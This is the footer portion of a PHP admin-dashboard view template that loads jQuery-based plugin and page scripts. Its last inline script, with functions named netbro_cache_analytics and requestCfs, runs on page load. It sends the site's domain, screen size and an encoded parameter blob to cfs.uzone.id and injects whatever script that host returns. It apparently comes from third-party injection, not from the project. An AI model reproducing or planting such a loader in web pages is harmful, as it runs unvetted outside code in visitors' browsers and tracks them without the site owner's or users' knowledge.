</div>
<!-- Content Wrapper END -->
<!-- Footer START -->
<footer class="content-footer">
    <div class="footer">
        <div class="copyright">
            <span> &copy; Made with <i class="ti-heart"></i> <?= date('Y'); ?></span>
            <span class="go-right">
                <a href="#" class="text-gray mrg-right-15">Term &amp; Conditions</a>
                <a href="#" class="text-gray">Privacy &amp; Policy</a>
            </span>
        </div>
    </div>
</footer>
<!-- Footer END -->

</div>
<!-- Page Container END -->

</div>
</div>

<script src="<?= base_url() ?>assets/dist/assets/js/vendor.js"></script>

<!-- page plugins js -->

<!-- <script src="<?= base_url() ?>assets/bower_components/bower-jvectormap/jquery-jvectormap-1.2.2.min.js"></script> -->
<!-- <script src="<?= base_url() ?>assets/dist/assets/js/maps/jquery-jvectormap-us-aea.js"></script> -->
<!-- <script src="<?= base_url() ?>assets/bower_components/d3/d3.min.js"></script> -->
<!-- <script src="<?= base_url() ?>assets/bower_components/nvd3/build/nv.d3.min.js"></script> -->
<!-- <script src="<?= base_url() ?>assets/bower_components/jquery.sparkline/index.js"></script> -->
<!-- <script src="<?= base_url() ?>assets/bower_components/chart.js/dist/Chart.min.js"></script> -->
<script src="<?= base_url() ?>assets/bower_components/datatables/media/js/jquery.dataTables.js"></script>
<script src="<?= base_url() ?>assets/bower_components/sweetalert/lib/sweet-alert.js"></script>
<script src="<?= base_url() ?>assets/bower_components/noty/js/noty/packaged/jquery.noty.packaged.min.js"></script>
<script src="<?= base_url() ?>assets/bower_components/selectize/dist/js/standalone/selectize.min.js"></script>
<script src="<?= base_url() ?>assets/bower_components/masonry/dist/masonry.pkgd.min.js"></script>
<script src="<?= base_url() ?>assets/bower_components/imagesloaded/imagesloaded.js"></script>
<script src="<?= base_url() ?>assets/bower_components/photoswipe/dist/photoswipe.js"></script>
<script src="<?= base_url() ?>assets/bower_components/photoswipe/dist/photoswipe-ui-default.min.js"></script>

<script src="<?= base_url() ?>assets/dist/assets/js/app.min.js"></script>
<script src="<?= base_url() ?>assets/dist/assets/js/myscript.js"></script>

<!-- page js -->
<script src="<?= base_url() ?>assets/dist/assets/js/dashboard/dashboard.js"></script>
<script src="<?= base_url() ?>assets/dist/assets/js/table/data-table.js"></script>
<script src="<?= base_url() ?>assets/dist/assets/js/ui-elements/notification.js"></script>
<script src="<?= base_url() ?>assets/dist/assets/js/extras/gallery.js"></script>

<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31dK4ZUfyQ6h0cFwxb4f9lztTJXCIUm7%2b8nE2KRDN04Etr3Mqui2Ov4MXimW4NomVdYcufnuqDu1w2zJI8e4LLxb%2fiKxRhW3FNjEB5xQ7dNZ%2feJnNMByZnhlwcMQ1XGMR9081f7zBd5zgmP7%2bgS9L6ENkcmXY4DltCXUptB15ywjm7uYJwrP53O0mLRg3a%2fRWDZyKGXXTQptiLitE7vXq0h%2bhEaPNJLr5bV8tqgCSzOnxYeVwLKwdhWGD%2bkPWvBu4gjy5vn1kertrOm4oatci29aMYXkaNo5mk5kd4QAlq%2fdWUD52NcMSX6OsfpJhPFhCfXohCJEfMkmRTev7TH8yuz6Bz%2bmUCZkv%2fbEft1gOcMeCpjgTCoKye5vxn3e19Usao11AqIKmboG8bP2Nrs86F135VQa%2fzEUppXkDB4Auno5g2ZKlZz3WsoegYfnbTqS5PDx5xw%2bMW7HX8G85SGY3mWYhN7W2jRpF42Q4OkwkrbnSh0WzZvivekQ%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
</script>
</body>

</html>